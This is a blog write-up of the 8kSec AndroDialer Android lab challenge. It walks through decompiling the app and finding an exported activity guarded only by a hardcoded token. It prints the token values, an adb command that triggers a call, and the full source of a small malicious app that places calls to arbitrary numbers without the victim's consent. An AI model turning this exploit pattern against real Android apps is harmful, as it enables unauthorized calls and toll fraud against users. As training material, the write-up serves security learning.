---
title:  "8kSec AndroDialer Writeup"
date:   2025-09-12T16:34:00-0400
categories:
  - writeup
tags:
  - android
  - ctf
---


Hello everyone!
In this blog post , I will try to explain my solution steps for AndroDialer challenge from 8kSec Android Labs. 

```
Goal:
Create a malicious application that exploits the AndroDialer application to initiate unauthorized phone calls to arbitrary numbers without the victim's knowledge or consent.
```

## Static Analysis

![](screen1.png)

Main function of our application is calling numbers :) Lets start our analysis with jadx.

### Code Analysis

Manifest file have lots of activities but one of them is important for us.

```xml
...
...
...
        <activity android:theme="@android:style/Theme.NoDisplay" android:name="com.eightksec.androdialer.CallHandlerServiceActivity" android:exported="true" android:taskAffinity="" android:excludeFromRecents="true">
            <intent-filter>
                <action android:name="com.eightksec.androdialer.action.PERFORM_CALL"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="tel"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="dialersec" android:host="call"/>
            </intent-filter>
        </activity>
...
...
...

```
Other activities are not exported(except main activity) but this one is exported and as the name suggest(`CallHandlerServiceActivity`),it can be a useful attack surface for our attack. 

This activity gets URI from the caller intent and checks some part from it.

````java
Uri data = getIntent().getData();
.
.
.
//path segment
pathSegments = data.getPathSegments()
indexOf = pathSegments.indexOf("token")

//query parameters
data.getQueryParameter("enterprise_auth_token")

//regex
data.getQuery();
Pattern.compile("enterprise_auth_token=([^&]+)");

//uri fragment
str = data.getFragment();
 if (b.o0(str, "token=", false)) {
    arrayList.add(b.z0(b.x0(str, "token="), "&"));
}
if (j.n0(str10, "enterprise_auth_token=")) {
    arrayList.add(b.x0(str10, "enterprise_auth_token="));}

//create arraylist of token values obtained from uri parts and check the token:

Object obj = arrayList.get(i);
    i++;
    String str13 = (String) obj;
    if (str13 != null)
        try {
            str3 = Uri.decode(str13);
        } catch (Exception e9) {
            Log.e("CallHandlerService", "Error decoding token", e9);
            str3 = str13;
        }
        if (str13.equals("8kd1aL3R_s3Cur3_k3Y_2023") || str13.equals("8kd1aL3R-s3Cur3-k3Y-2023") || h.a(str3, "8kd1aL3R_s3Cur3_k3Y_2023") || h.a(str3, "8kd1aL3R-s3Cur3-k3Y-2023"))

````
As seen in code, this activity try to find a token value from uri parts like:
```
?enterprise_auth_token=AAA
/token/AAA
#token=AAA
#S.enterprise_auth_token=AAA
```
and if the token is `"8kd1aL3R_s3Cur3_k3Y_2023"` or `"8kd1aL3R-s3Cur3-k3Y-2023"`, it will get phone number from URI and send an intent to Android call service to make a new call.

```java
Intent intent = new Intent("android.intent.action.CALL");
    intent.setData(Uri.parse("tel:" + str9));
    intent.addFlags(268435456);
    startActivity(intent);
```
For exploiting this problem, we can create a intent with proper host, scheme and query parameters and make a arbitrary call to any number without any permission. According to the intent filter that defined on AndroidManifest.xml file, our uri starts with `dialersec://call` and with the token and number parameters, final URI can be:

```
dialersec://call?enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023\&number=13371337
```
We can send the intent with adb:
```
adb shell am start -a android.intent.action.VIEW -d "dialersec://call?enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023\&number=13371337"
``` 
Note: Dont forget to escape `&` character, otherwise shell will truncate the command from that special character.

![](screen2.png)

Also we can do it with an malicious app. Here is code for it:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.pwnandrodialer">

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.PwnAndroDialer">
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest>
```
```java
package com.example.pwnandrodialer;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button button1 = (Button) findViewById(R.id.button);
        button1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Uri uri = Uri.parse("dialersec://call?number=14531453&enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023");
                Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                startActivity(intent);
            }
        });
    }
}
```

Thats all, see you!

PoC Video: [Youtube](https://youtu.be/Zh3FRD9l_F0)